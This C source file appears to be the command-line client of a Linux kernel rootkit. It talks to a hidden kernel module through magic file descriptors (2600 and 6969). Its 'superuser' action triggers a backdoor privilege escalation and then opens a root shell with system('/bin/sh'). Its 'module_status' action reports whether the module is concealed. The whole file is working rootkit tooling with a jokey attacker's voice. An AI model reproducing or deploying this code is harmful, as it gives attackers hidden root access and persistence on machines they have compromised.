#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include <print.h>
#include <read.h>

#define SUPER_FD 		(2600)
#define IS_HIDDEN_FD 	(6969)

int read_superuser() {
	int ret = read(SUPER_FD, NULL, 0);
	if (ret == 0) {
		print_success("You're a SUPERuser now chief ;), opening a shell.");
		system("/bin/sh");	
	} else {
		print_error("Couldn't elevate your privileges");
	}
	return ret;
}

int read_is_mod_hidden() {
	int is_hidden = 0;
	int ret = read(IS_HIDDEN_FD, &is_hidden, sizeof(int));

	if (ret != 0) {
		print_error("Couldn't get module status.");
		return ret;
	}

	print_bool("Is module hidden ?", is_hidden);
	
	return ret;
}

int read_run(const char *action) {
	
	const char *actions[] = { "superuser", "module_status", NULL };
	if (action == NULL) {
		print_error("Read action not specified.");
		print_list("Here are all the actions you can do: ", actions);
		return -2;
	}

	if (!strncmp(action, actions[0], 10)) {
		return read_superuser();
	} else if (!strncmp(action, actions[1], 14)) {
		return read_is_mod_hidden();
	}
	
	print_error("Action doesn't exist.");
	return -2;
}
